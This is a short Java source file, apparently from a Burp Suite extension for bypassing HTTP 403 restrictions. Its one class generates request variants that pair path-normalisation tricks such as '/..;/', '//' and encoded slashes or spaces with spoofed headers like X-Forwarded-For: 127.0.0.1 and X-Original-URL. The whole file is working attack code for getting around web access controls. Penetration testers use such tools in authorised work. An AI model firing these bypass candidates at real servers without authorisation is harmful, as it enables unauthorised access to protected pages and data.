package bypass403.techniques;

import burp.api.montoya.http.message.requests.HttpRequest;
import java.util.ArrayList; import java.util.List;

public class PathHeaderCombinationTechnique implements BypassTechnique {
    public String getName(){ return "Path + header combination"; }
    public List<HttpRequest> generateCandidates(HttpRequest original){
        ArrayList<HttpRequest> out=new ArrayList<>();
        String path=original.path(); String base=path.indexOf('?')>=0?path.substring(0,path.indexOf('?')):path;
        String[] paths={base+"/", base+"/.", base+"//", base+"/..;/", base+"/.;/", "/./"+base.substring(base.lastIndexOf('/')+1), "//"+base.substring(base.lastIndexOf('/')+1), base+"%20",base+"%09",base+"%2f",base+"/.."};
        String[][] headers={{"X-Forwarded-For","127.0.0.1"},{"X-Original-URL",base},{"X-Rewrite-URL",base},{"X-Forwarded-Host","localhost"}};
        for(String p:paths) for(String[] h:headers) out.add(original.withPath(p).withAddedHeader(h[0],h[1]));
        return out;
    }
}
